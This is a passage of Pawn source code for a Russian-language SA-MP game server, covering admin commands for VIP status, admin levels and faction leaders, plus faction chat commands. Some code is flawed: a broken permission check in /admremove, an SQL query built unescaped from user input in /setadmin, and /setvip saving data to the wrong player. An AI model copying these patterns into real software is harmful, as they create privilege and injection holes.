	for(new x = 25; x > 0; x --) SendClientMessageToAll(COLOR_GREY, " ");
	SendClientMessage(playerid, C_RED, "Внимание! Происходит рестарт на сервере");
	SendClientMessage(playerid, C_RED, "Рестарт будет длиться 20-30 секунд");
	SendClientMessage(playerid, C_RED, "С Уважением администрация HOME ONLINE!");
	SaveWarehouse();
	SetTimer("GameModeExitDelay", 5000, false);
	return 1;
}

CMD:setvip(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 5)
		return 1;

	if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "ui", params[0], params[1])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /setvip [id игрока] [кол-во дней]");
	else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
	else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
	else if(params[1] < 0 || params[1] > 30) return SendClientMessage(playerid, COLOR_GREY, "Нельзя выдавать VIP статус более чем на 30 дней");
	new string[128];
	if(params[1] > 0)
	{
		new year, month, day;
		getdate(year, month, day);
		new current_date = getdate(year, month, day);
		PI[params[0]][pVip] = 1;
		PI[params[0]][pVipTime] = current_date + params[1];
		format(string, sizeof(string), "Вы выдали VIP статус игроку %s на %i дней", GetName(params[0]), params[1]);
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string, sizeof(string), "%s %s выдал вам VIP статус на %i дней", GetPlayerAdminName(playerid), GetName(playerid), params[1]);
		SendClientMessage(params[0], COLOR_YELLOW, string);
		MysqlUpdatePlayerInt(playerid, "vip", PI[playerid][pVip]);
		MysqlUpdatePlayerInt(playerid, "viptime", PI[playerid][pVipTime]);
	}
	else if(params[1] == 0)
	{
		PI[params[0]][pVip] = 0;
		PI[params[0]][pVipTime] = 0;
		format(string, sizeof(string), "Вы забрали VIP статус у игрока %s", GetName(params[0]));
		SendClientMessage(playerid, COLOR_YELLOW, string);
		format(string, sizeof(string), "%s %s забрал у Вас VIP статус", GetPlayerAdminName(playerid), GetName(playerid));
		SendClientMessage(params[0], COLOR_YELLOW, string);
		MysqlUpdatePlayerInt(playerid, "vip", PI[playerid][pVip]);
		MysqlUpdatePlayerInt(playerid, "viptime", PI[playerid][pVipTime]);
	}
	return 1;
}

CMD:pmenu(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
    if(PI[playerid][pAdmin] < 7) return 1;

	ShowPlayerDialog(playerid,D_PROMO,DIALOG_STYLE_LIST,"Меню промокодов","\
	1. Создать промокод \n\
	2. Действующие промокоды \n\
	3. Активированные промокоды \n\
	4. Заблокированные промокоды \n\
	{F66B6D}5. Заблокировать промокод \n\
	{F66B6D}6. Удалить промокод","Далее","Выход");
	return true;
}

CMD:alogs(playerid, params[])
{
	if(PI[playerid][pAdmin] < 5)
		return 1;

	if(AdminInfo[playerid][admAlog] == 0)
	{
		AdminInfo[playerid][admAlog] = 1;

		SendClientMessage(playerid, COLOR_BLUE, "Вы включили информацию о входах/выходах");
	}
	else
	{
		AdminInfo[playerid][admAlog] = 0;

		SendClientMessage(playerid, COLOR_BLUE, "Вы выключили информацию о входах/выходах");
	}

	new fmt_query[80];

	mysql_format(dbHandle, fmt_query, sizeof fmt_query, "UPDATE "T_ADMIN" SET alog=%d WHERE name='%s' LIMIT 1", AdminInfo[playerid][admAlog], GetName(playerid));
	mysql_tquery(dbHandle, fmt_query, "", "");

	return 1;
}

CMD:aclogs(playerid, params[])
{
	if(PI[playerid][pAdmin] < 5)
		return 1;

	AdminInfo[playerid][admAclog] = AdminInfo[playerid][admAclog] ^ 1;

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "Вы %s логи античита", AdminInfo[playerid][admAclog] == 0 ? ("выключили") : ("включили"));
	SendClientMessage(playerid, COLOR_BLUE, STRING_GLOBAL);

	return 1;
}

CMD:unbanadm(playerid, params[])
{
	if(PI[playerid][pAdmin] < 5)
		return 1;

	extract params -> new to_player; else return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /unbanadm [ид]");

	if(PI[to_player][pAdmin] != 0)
	{
		if(admin_ban_time[to_player] > 0)
		{
			new fmt_msg[128];

			format(fmt_msg, sizeof fmt_msg, "Руководитель %s снял Вам блокировку админ-действий", GetName(playerid));
			SendClientMessage(to_player, 0xFFCC00FF, fmt_msg);

			format(fmt_msg, sizeof fmt_msg, "Вы разблокировали админ-действия %s", GetName(to_player));
			SendClientMessage(playerid, 0xFFCC00FF, fmt_msg);

			format(fmt_msg, sizeof fmt_msg, "[A] Руководитель %s[%d] разблокировал админ-действия %s[%d]", GetName(playerid), playerid, GetName(to_player), to_player);
			SendAdminMessage(COLOR_GREY, fmt_msg);

			admin_ban_time[to_player] = 0;

			MysqlUpdatePlayerInt(to_player, "ban_time", admin_ban_time[to_player]);
		}
		else SendClientMessage(playerid, -1, "У этого администратора не заблокированы админ-действия");
	}
	else SendClientMessage(playerid, -1, "Этот игрок не является администратором");

	return 1;
}

CMD:setadmin(playerid, params[])
{
	if(PI[playerid][pAdmin] < 6)return false;
	if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");

	if(PlayerLogged[playerid] == false) return 1;
	new playername[24], admin_level;

	if(strlen(playername) > 24)
		return SendClientMessage(playerid, C_RED, "Вы ввели слишком длинный ник");

	if(sscanf(params, "s[24]i", playername, admin_level)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /setadmin [ник игрока] [уровень админа]");
	new string[128];
	format(string, sizeof(string), "SELECT * FROM "T_ADMIN" WHERE `name` = '%s'", playername);
	mysql_tquery(dbHandle, string, "SetAdmin", "isi", playerid, playername, admin_level);
	return 1;
}

CMD:admremove(playerid, params[])
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");

	if(PI[playerid][pAdmin] < 6)

	if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	else if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /admremove [id игрока]");
	else if(PI[params[0]][pAdmin] < 1) return SendClientMessage(playerid, COLOR_GREY, "Этот игрок не является администратором");
	RemoveAdmin(params[0], GetName(params[0]));
	new string[128];
	SendMes(playerid, COLOR_GREEN, "Вы сняли %s с должности администратора", GetName(params[0]));
	format(string, sizeof(string), "[Внимание] %s[%i] снял %s с должности администратора", GetName(playerid), playerid, GetName(params[0]));
	SendAdminMessageEx(COLOR_RED, string, 5);
	return 1;
}

CMD:admdown(playerid, params[])
{
    if(IsPlayerGrandAdmin(playerid))
    {
    	if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
		if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
		else if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /admdown [id игрока]");
		else if(PI[params[0]][pAdmin] < 1) return SendClientMessage(playerid, COLOR_GREY, "Этот игрок не является администратором");
		else if(PI[params[0]][pAdmin] > 9) return SendClientMessage(playerid, COLOR_GREY, "Этот администратор не может быть понижен");
		else if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Нельзя изменить свой уровень");
		new string[128];
		if(PI[params[0]][pAdmin] > 1)
		{
			PI[params[0]][pAdmin]--;
			MysqlUpdatePlayerInt(params[0], "admin", PI[params[0]][pAdmin]);
			format(string, sizeof(string), "%s понизил Ваш уровень администратора", GetName(playerid));
			SendClientMessage(params[0], COLOR_YELLOW, string);
			format(string, sizeof(string), "[A] %s[%d] понизил администратора %s[%d] до %d уровня", GetName(playerid), playerid, GetName(params[0]), params[0], PI[params[0]][pAdmin]);
			SendAdminMessageEx(COLOR_GREY, string, 5);
			mysql_format(dbHandle, string, sizeof(string), "UPDATE "T_ADMIN" SET `level` = '%d' WHERE `name` = '%s' LIMIT 1", PI[params[0]][pAdmin], GetName(params[0]));
			mysql_tquery(dbHandle, string, "", "");
		}
		else if(PI[params[0]][pAdmin] == 1)
		{
			RemoveAdmin(params[0], GetName(params[0]));
			format(string, sizeof(string), "[A] %s снял %s с должности администратора", GetName(playerid), GetName(params[0]));
			SendAdminMessageEx(COLOR_RED, string, 5);
		}
	}
	return 1;
}

CMD:admup(playerid, params[])
{
    if(IsPlayerGrandAdmin(playerid))
    {
    	if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
		if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
		else if(sscanf(params, "i", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /admup [id игрока]");
		else if(PI[params[0]][pAdmin] < 1) return SendClientMessage(playerid, COLOR_GREY, "Этот игрок не является администратором");
		else if(PI[params[0]][pAdmin] > 9) return SendClientMessage(playerid, COLOR_GREY, "Этот администратор не может быть повышен");
		else if(params[0] == playerid) return SendClientMessage(playerid, COLOR_GREY, "Нельзя изменить свой уровень");
		new string[128];
		PI[params[0]][pAdmin]++;
		MysqlUpdatePlayerInt(params[0], "admin", PI[params[0]][pAdmin]);
		format(string, sizeof(string), "%s повысил Ваш уровень администратора", GetName(playerid));
		SendClientMessage(params[0], COLOR_YELLOW, string);
		format(string, sizeof(string), "[A] %s[%d] повысил администратора %s[%d] до %d уровня", GetName(playerid), playerid, GetName(params[0]), params[0], PI[params[0]][pAdmin]);
		SendAdminMessageEx(COLOR_GREY, string, 5);
		mysql_format(dbHandle, string, sizeof(string), "UPDATE "T_ADMIN" SET `level` = '%d' WHERE `name` = '%s' LIMIT 1", PI[params[0]][pAdmin], GetName(params[0]));
		mysql_tquery(dbHandle, string, "", "");
	}
	return 1;
}

CMD:setleader(playerid, params[])
{
    if(IsPlayerGrandAdmin(playerid))
    {
	    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
		else if(sscanf(params, "u", params[0])) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /setleader [id игрока]");
		else if(!IsPlayerConnected(params[0])) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(PlayerLogged[params[0]] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
		else if(IsPlayerInAnyVehicle(params[0])) return SendClientMessage(playerid, COLOR_GREY, "Игрок не должен находиться в транспорте!");
		else if((PI[params[0]][pAdmin] >= 1 && PI[params[0]][pAdmin] <= 6) && PI[playerid][pAdmin] != 12) return SendClientMessage(playerid, COLOR_GREY, "Администратора нельзя ставить на пост лидера!");
		else if(PI[params[0]][pTempLeader]) return SendClientMessage(playerid, COLOR_GREY, "Сначала снимите с себя права временного состояние в организации!");
		if(PI[params[0]][pLeader])
		{
			LeaveFractionPlayer(params[0]);
			SendMes(playerid, COLOR_BLUE, "Вы сняли %s с должности лидера организации",GetName(params[0]));
			SendMes(params[0], COLOR_BLUE, "Администратор %s снял Вас с должности лидера организации", GetName(playerid));
		}
		else
		{
			if(PI[params[0]][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
			if(PI[params[0]][pMember] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
			new str[90], str2[600];
			for(new i = 1; i < MAX_FRACTIONS; i++)
			{
				format(str, sizeof(str), "№%i - %s\n", i, Fraction_Name[i]);
				strcat(str2, str);
			}
			SetPVarInt(playerid, "actplayerid", params[0]);
			ShowPlayerDialog(playerid, D_FRACMENU, 2, "Организации", str2, "Принять", "Отмена");
		}
	}
	return 1;
}
CMD:templeader(playerid, params[])
{
    if(IsPlayerGrandAdmin(playerid))
    {
	    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");

		new id, frac;
		if(sscanf(params, "ud", id, frac))
			return SendClientMessage(playerid, -1, "Используйте /templeader [id игрока] [номер фракции]");
		else if(id == INVALID_PLAYER_ID)
			return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(!(0 <= frac <= MAX_FRACTIONS))
			return SendClientMessage(playerid, -1, "Вы ввели неправильный номер фракции.");

		if(PI[id][pMember] > 0)
			SendClientMessage(playerid, -1, "Игрок состоит в организации. Сначала нужно его уволить");

		switch(frac)
		{
			case TEAM_ARMIYA,TEAM_POLICIA,TEAM_POLICIA2,TEAM_SWAT: PI[id][pRank] = 10;
			case TEAM_FBI: PI[id][pRank] = 10;
			case TEAM_MERIA,TEAM_VDV,TEAM_PRAVO,TEAM_BOLNICA,TEAM_SFHOSPITAL,TEAM_LVHOSPITAL,TEAM_GROOVE..TEAM_VAGOS,TEAM_OPG1..TEAM_YAK,TEAM_SMI,TEAM_SFNEWS,TEAM_LVNEWS: PI[id][pRank] = 10;
			case TEAM_AUTOSCHOOL: PI[id][pRank] = 8;
		}
		PI[id][pLeader] = PI[id][pMember] = frac;
		PI[id][pLWarn] = PI[id][pJob] = 0;
		PI[id][pSpawnChange] = 2;
		MysqlUpdatePlayerInt(id, "spawnchange", PI[id][pSpawnChange]);
		MysqlUpdatePlayerInt(id, "lwarn", PI[id][pLWarn]);

		STRING_GLOBAL[0] = EOS;
		format(STRING_GLOBAL, sizeof STRING_GLOBAL, "UPDATE accounts SET memberskin=%d, leader=%d, member=%d, rank=%d, job=0 WHERE name='%s'", PI[id][pMemberSkin], PI[id][pLeader], PI[id][pMember], PI[id][pRank], GetName(id));
		mysql_query(dbHandle, STRING_GLOBAL);

		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Вы назначили %s временным лидером организации: %s", GetName(id), Fraction_Name[frac]);
		SendClientMessage(playerid, COLOR_LIME, STRING_GLOBAL);
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "Администратор %s назначил Вас временным лидером организации: %s", GetName(playerid), Fraction_Name[frac]);
		SendClientMessage(id, COLOR_BLUE, STRING_GLOBAL);
		format(STRING_GLOBAL, sizeof(STRING_GLOBAL), "[A] %s назначил %s временным лидером организации \"%s\"", GetName(playerid), GetName(id), Fraction_Name[frac]);
		SendAdminMessage(COLOR_GREY, STRING_GLOBAL);
		ResetPlayerWeapons(id);
		SetPlayerColorEx(id, TeamColors[GetTeamID(id)]);
	}
	return 1;
}
CMD:ainvite(playerid)
{
    if(admin_ban_time[playerid] > 0) return SendClientMessage(playerid, -1, "Ваши админ-действия на сервере заблокированы");
	if(PI[playerid][pAdmin] < 5) return 1;
	else if(AdminLogged[playerid] == false) return SendMess(playerid, MSG_YOU_NOT_LOGGED_AS_ADMIN);
	if(PI[playerid][pTempLeader])
	{
		if(PI[playerid][pTempLeader] == 0) return SendClientMessage(playerid, COLOR_GREY, "Вы не состоите в организации!");
		LeaveFractionPlayer(playerid);
		PI[playerid][pTempLeader] = 0;
		SendClientMessage(playerid, COLOR_BLUE, "Вы тихо вышли из организации.");
		MysqlUpdatePlayerInt(playerid, "templeader", PI[playerid][pTempLeader]);
	}
	else
	{
		new str[90];
		STRING_GLOBAL[0] = EOS;
		for(new i = 1; i < MAX_FRACTIONS; i++)
		{
			format(str, sizeof(str), "№%i - %s\n", i, Fraction_Name[i]);
			strcat(STRING_GLOBAL, str);
		}
		ShowPlayerDialog(playerid, D_TEMPLEADER, 2, "Организации", STRING_GLOBAL, "Принять", "Отмена");
	}
	return 1;
}

CMD:k(playerid, params[])
{
	new familyid = PI[playerid][P_FAMILY];

	if(familyid == 0)
		return SendMess(playerid, MSG_NO_PLAYER_CONSIST_FAMILY);

	if(isnull(params))
		return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {ffffff}Введите: /k [текст]");

	new family_rang[][] = {"Член семьи", "Заместитель", "Создатель"};

	STRING_GLOBAL[0] = EOS;
	format(STRING_GLOBAL, sizeof STRING_GLOBAL, "[%s] %s %s [%d]: %s", GetFamilyData(familyid-1, F_NAME), family_rang[GetFamilyRang(playerid)-1], GetName(playerid), playerid, params[0]);
	SendFamilyMessage(familyid, STRING_GLOBAL);

	return 1;
}

CMD:f(playerid, params[])
{
	if(PI[playerid][pMember] >= 7 && PI[playerid][pMember] <= 11 || PI[playerid][pMember] >= 13 && PI[playerid][pMember] <= 17)
	{
		if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
		else if(Settings[playerid][0] == 1) return SendClientMessage(playerid, COLOR_GREY, "Ваш чат организации отключен!");
		else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /f [текст]");
		else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid,COLOR_GREY,"Не флуди");
		else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
		new string[128], mesid[128];
		format(string, sizeof(string), "[F] %s %s: %s", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), params[0]);
		format(mesid, sizeof(mesid), "[F] %s %s[%d]: %s", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), playerid, params[0]);
		if(Settings[playerid][2] == 1) SendFMes(PI[playerid][pMember], 0x4682B4AA, string);
		else SendFMes(PI[playerid][pMember], 0x4682B4AA, mesid);
		SetString(OldMessage[playerid], params[0]);
		TextReset[playerid] = gettime()+3;
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:fn(playerid, params[])
{
	if(PI[playerid][pMember] >= 7 && PI[playerid][pMember] <= 11 || PI[playerid][pMember] >= 13 && PI[playerid][pMember] <= 17)
	{
		if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
		else if(Settings[playerid][0] == 1) return SendClientMessage(playerid, COLOR_GREY, "Ваш чат организации отключен!");
		else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /fn [текст]");
		else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid,COLOR_GREY,"Не флуди");
		else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
		new string[128], mesid[128];
		format(string, sizeof(string), "(( [F] %s %s: %s ))", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), params[0]);
		format(mesid, sizeof(mesid), "(( [F] %s %s[%d]: %s ))", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), playerid, params[0]);
		if(Settings[playerid][2] == 1) SendFMes(PI[playerid][pMember], 0x4682B4AA, string);
		else SendFMes(PI[playerid][pMember], 0x4682B4AA, mesid);
		SetString(OldMessage[playerid], params[0]);
		TextReset[playerid] = gettime()+3;
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:r(playerid, params[])
{
	if(IsACop(playerid) || PI[playerid][pMember] == TEAM_ARMIYA || IsAMedic(playerid) || IsAMayor(playerid) || PI[playerid][pMember] == TEAM_AUTOSCHOOL || IsANews(playerid))
	{
		if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
		else if(Settings[playerid][0] == 1) return SendClientMessage(playerid, COLOR_GREY, "Ваш чат организации отключен!");
		else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /r [текст]");
		else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid,COLOR_GREY,"Не флуди");
		else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
		new string[128], mesid[128];
		format(string, sizeof(string), "[R] %s %s: %s", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), params[0]);
		format(mesid, sizeof(mesid), "[R] %s %s[%d]: %s", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), playerid, params[0]);
		if(Settings[playerid][2] == 1) SendFMes(PI[playerid][pMember], 0x5da130FF, string);
		else SendFMes(PI[playerid][pMember], 0x5da130FF, mesid);
		SetPlayerChatBubble(playerid,"сообщает в рацию",COLOR_PURPLE,30.0,10000);
		SetString(OldMessage[playerid], params[0]);
		TextReset[playerid] = gettime()+3;
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}



CMD:rb(playerid, params[])
{
	if(PI[playerid][pJob] == JOB_TRUCK)
	{
		if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
		else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /rb [текст]");
		else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid,COLOR_GREY,"Не флуди");
		else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
		new string[128], mesid[128];
		format(string, sizeof(string), "(( Дальнобойщик %s: %s ))", GetName(playerid), params[0]);
		format(mesid, sizeof(mesid), "(( Дальнобойщик %s[%d]: %s ))", GetName(playerid), playerid, params[0]);
		if(Settings[playerid][2] == 1) SendFMes(PI[playerid][pMember], 0x5da130FF, string);
		else SendDalnoMes(PI[playerid][P_JOB], 0x5da130FF, mesid);
		SetPlayerChatBubble(playerid,"сообщает в рацию",COLOR_PURPLE,30.0,10000);
		SetString(OldMessage[playerid], params[0]);
		TextReset[playerid] = gettime()+8;
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:rn(playerid, params[])
{
	if(IsACop(playerid) || PI[playerid][pMember] == TEAM_ARMIYA || IsAMedic(playerid) || IsAMayor(playerid) || PI[playerid][pMember] == TEAM_AUTOSCHOOL || IsANews(playerid))
	{
		if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
		else if(Settings[playerid][0] == 1) return SendClientMessage(playerid, COLOR_GREY, "Ваш чат организации отключен!");
		else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /rn [текст]");
		else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid,COLOR_GREY,"Не флуди");
		else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
		new string[128], mesid[128];
		format(string, sizeof(string), "(( [R] %s %s: %s ))", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), params[0]);
		format(mesid, sizeof(mesid), "(( [R] %s %s[%d]: %s ))", Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), playerid, params[0]);
		if(Settings[playerid][2] == 1) SendFMes(PI[playerid][pMember], 0x5da130FF, string);
		else SendFMes(PI[playerid][pMember], 0x5da130FF, mesid);
		SetPlayerChatBubble(playerid,"сообщает в рацию",COLOR_PURPLE,30.0,10000);
		SetString(OldMessage[playerid], params[0]);
		TextReset[playerid] = gettime()+3;
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:d(playerid, params[])
{
	if(IsACop(playerid) || PI[playerid][pMember] == TEAM_ARMIYA || IsAMedic(playerid) || IsAMayor(playerid) || PI[playerid][pMember] == TEAM_AUTOSCHOOL || IsANews(playerid))
	{
		if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
		else if(Settings[playerid][0] == 1) return SendClientMessage(playerid, COLOR_GREY, "Ваш чат организации отключен!");
		else if(GetPVarInt(playerid,"dep") > gettime()) return SendClientMessage(playerid, 0xFF7979AA, "Следующее сообщение Вы сможете отправить через 15 секунд!");
		else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /d [текст]");
		else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid,COLOR_GREY,"Не флуди");
		else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
		new string[128], mesid[128];
		format(string, sizeof(string), "[D] [%s] %s %s: %s", Fraction_Name[PI[playerid][pMember]], Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), params[0]);
		format(mesid, sizeof(mesid), "[D] [%s] %s %s[%d]: %s", Fraction_Name[PI[playerid][pMember]], Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), playerid, params[0]);
		if(Settings[playerid][2] == 1) SendDMes(0x007FFFFF, string);
		else SendDMes(0x007FFFFF, mesid);
		SetPlayerChatBubble(playerid,"сообщает в депортамент",COLOR_PURPLE,30.0,10000);
		SetPVarInt(playerid,"dep",gettime() + 15);
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:dn(playerid, params[])
{
	if(IsACop(playerid) || PI[playerid][pMember] == TEAM_ARMIYA || IsAMedic(playerid) || IsAMayor(playerid) || PI[playerid][pMember] == TEAM_AUTOSCHOOL || IsANews(playerid))
	{
		if(PI[playerid][pMuted] > 0) return SendMess(playerid, MSG_PLAYER_HAVE_MUTE);
		else if(Settings[playerid][0] == 1) return SendClientMessage(playerid, COLOR_GREY, "Ваш чат организации отключен!");
		else if(GetPVarInt(playerid,"dep") > gettime()) return SendClientMessage(playerid, 0xFF7979AA, "Следующее сообщение Вы сможете отправить через 15 секунд!");
		else if(isnull(params)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /dn [текст]");
		else if(TextReset[playerid] > gettime() && GetString(OldMessage[playerid], params[0])) return SendClientMessage(playerid,COLOR_GREY,"Не флуди");
		else if(IsIpFound(params[0]) || CheckString(params[0])) return PlayerGetsChatBan(playerid, params[0]);
		new string[128], mesid[128];
		format(string, sizeof(string), "(( [D] [%s] %s %s: %s ))", Fraction_Name[PI[playerid][pMember]], Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), params[0]);
		format(mesid, sizeof(mesid), "(( [D] [%s] %s %s[%d]: %s ))", Fraction_Name[PI[playerid][pMember]], Fraction_Rang[PI[playerid][pMember]][PI[playerid][pRank]], GetName(playerid), playerid, params[0]);
		if(Settings[playerid][2] == 1) SendDMes(0x007FFFFF, string);
		else SendDMes(0x007FFFFF, mesid);
		SetPVarInt(playerid,"dep",gettime() + 15);
	}
	else SendMess(playerid, MSG_YOU_CAN_NOT);
	return 1;
}

CMD:find(playerid)
{
	if(PI[playerid][pMember] == 0) return SendMess(playerid, MSG_YOU_CAN_NOT);
	new string[150], text[20];

	STRING_GLOBAL[0] = EOS;
    strcat(STRING_GLOBAL, "{FFFF00}ID\tУровень\tТелефон\tРанг\tИмя игрока\n\n");
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(PI[i][pMember] == PI[playerid][pMember])
		{
		    if(PI[i][pPhoneNumber] <= 1) format(text, sizeof(text), "None\t\t");
			else format(text, sizeof(text), "%i\t\t", PI[i][pPhoneNumber]);
		    format(string, sizeof(string),"{FFFFFF}%i\t%i\t\t%s%i\t%s\n", i, PI[i][pLevel], text, PI[i][pRank], GetName(i));
			strcat(STRING_GLOBAL, string);
		}
	}
	ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "Члены организации в сети", STRING_GLOBAL, "Закрыть", "");
	return 1;
}

CMD:leaders(playerid)
{
	new str[150], text[20];

	STRING_GLOBAL[0] = EOS;
	strcat(STRING_GLOBAL, "{FFFF00}Организация - Должность - Имя игрока - Телефон - Выговоры\n\n");
	foreach(new i: Player)
	{
		if(PlayerLogged[i] == false) continue;
		if(PI[i][pLeader] > 0 && PI[i][pAdmin] == 0)
		{
		    if(PI[i][pPhoneNumber] <= 1) format(text, sizeof(text), "None");
			else format(text, sizeof(text), "%i", PI[i][pPhoneNumber]);
			format(str, sizeof(str),"{FFFFFF}%s - %s - %s - %s - [%i/3]\n", Fraction_Name[PI[i][pLeader]], Fraction_Rang[PI[i][pMember]][PI[i][pRank]], GetName(i), text, PI[i][pLWarn]);
			strcat(STRING_GLOBAL, str);
		}
	}
	ShowPlayerDialog(playerid, D_NULL, DIALOG_STYLE_MSGBOX, "Лидеры организаций в сети", STRING_GLOBAL, "Закрыть", "");
	return 1;
}

CMD:invite(playerid, params[])
{
	if(IsAbleToInvite(playerid))
	{
		new targetid;
		if(sscanf(params, "u", targetid)) return SendClientMessage(playerid, 0xFFCC00AA, "•[Подсказка] {FFFFFF}Введите: /invite [id игрока]");
		else if(!IsPlayerConnected(targetid)) return SendMess(playerid, MSG_PLAYER_OFFLINE);
		else if(PlayerLogged[targetid] == false) return SendMess(playerid, MSG_PLAYER_NOT_LOGGED);
		else if(PI[targetid][pLeader] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок лидер другой организации!");
		else if(PI[targetid][pMember] > 0) return SendClientMessage(playerid, COLOR_GREY, "Игрок находиться в другой организации!");
		else if(PI[targetid][pWarn] > 0) return SendClientMessage(playerid, COLOR_GREY, "У игрока предупреждение!");
